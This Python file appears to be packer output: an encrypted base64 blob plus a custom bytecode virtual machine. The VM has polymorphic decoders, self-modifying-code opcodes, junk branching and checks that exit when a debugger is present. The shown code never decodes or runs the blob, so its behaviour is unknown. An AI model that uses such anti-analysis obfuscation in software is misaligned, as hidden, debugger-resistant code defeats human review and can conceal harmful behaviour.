#!/usr/bin/env python3
def _jyond(_qjdmpjagh):
    return _qjdmpjagh % 9681 + 1

import hashlib as _qixxsckb, hmac as _yajcbfj, base64 as _aolxjt, sys as _yowcqk, zlib as _ivmip
_qjdmpjagh = 928809
_uqjsrtvu = """2vIluLEvXvFYEqEOFVGy17lh/rrYZAc/dxATCypY9S0LoVwnaKrmvW4pxk/MV6Qgz5QTo6r32sqMyVwTrE9g/SfnbNTUlYyEGvT/qh374k/AKGG/WxVl8pLTw9WVGc4uKNfJzruO6jqNSHe0cblew1aqPU/sCLJWtSFyZNTwlnwdytPu+5uWN21fuXXgh3i/c8lzyJU1mh5wDVn6Cinzl4BOoUsLKQYux0zSV6+bJlnJU4a6wPVhKhMwLvHSmbqOjBjdCnUoB/8d+CIelpQUkrZvDoD6Q3zu/1Gl6WYx94xqSWJ73/aIw5u4k5voipibsnoIPkGaPyEHnqM1PEHULs7H33W7TzzhuGd2PJ8RqABwubEhRk3gQBVqaZrre/fP5M6s0GJt//rz25uHxhaeShn4sJfw3fDSCaEyQq7FZagvFyMhwAL4WLB8MloUv97Uiu2c8H+gPLe3+O1VYpUpYLUSajpCno5T+aGfUqaZQB0mm1BhSbX0qa62wVvSvoqFxQSyLsr0WNayL9Efnm4MmbL4bHY6dklhkPilRGAabSJxeMfozgz47TJFhdhkmL7nWP6/1bAm0DcD1U4ENrz3DHMk3t5HqUsBcTpaQl+i5avq/bpVFjehpieounHSeBcydi0JrsLrmjxIL3nH/gDg5mUAZvxWuM8fTDpts+iIGzO6f7TpE0n5TYm8kYD95ZUIr2JUj0pwP0csVELgPAF9eRKak0f/05wEuoHQTa7lGT2Z+ITYgLpNXFjR4U8beI7xhOmlK//60ZQMpsUf42XMwrnjyCDjlAY0/uFzB0JKUzwN2qppOayvhfBNrkBHi72AKgmMPaDUAXEFxLZVWlehksMkM05JAcRK6djgQV2loDkgoqBCDPjrBgV/dnfbZi2N17/lM4OKnyA7g245XvT35r262oM="""
_gbbxoygji = 3
_vuaquw = _jyond(_qjdmpjagh)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _flags = int.from_bytes(bytes(_map[252:256]), 'little')
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    _pos = 256
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
    return _code, _consts, _names, _map, _op_key, _vl_flag, _poly_flag


def _njwhj():
    if _yowcqk.gettrace() is not None:
        _yowcqk.stderr.write('error: debugger detected\n'); _yowcqk.exit(1)
